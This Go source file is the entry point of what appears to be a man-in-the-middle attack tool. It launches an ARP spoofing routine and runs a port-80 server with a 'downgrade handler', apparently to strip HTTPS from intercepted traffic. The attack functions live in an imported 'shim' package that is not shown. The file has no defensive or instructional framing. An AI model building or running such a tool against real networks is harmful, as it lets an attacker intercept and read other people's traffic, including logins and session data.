package main

import (
    "log"
    "./shim"
)

func main() {
    go shim.ArpSpoof()
    downgradeHandler := shim.NewDowngradeHandler()
    server := shim.Server{
        RequestHandlers: []shim.RequestHandler{
            downgradeHandler,
        },
        ResponseHandlers: []shim.ResponseHandler{
            downgradeHandler,
        },
    }
    err := server.Run(80)
    log.Println(err.Error())
}
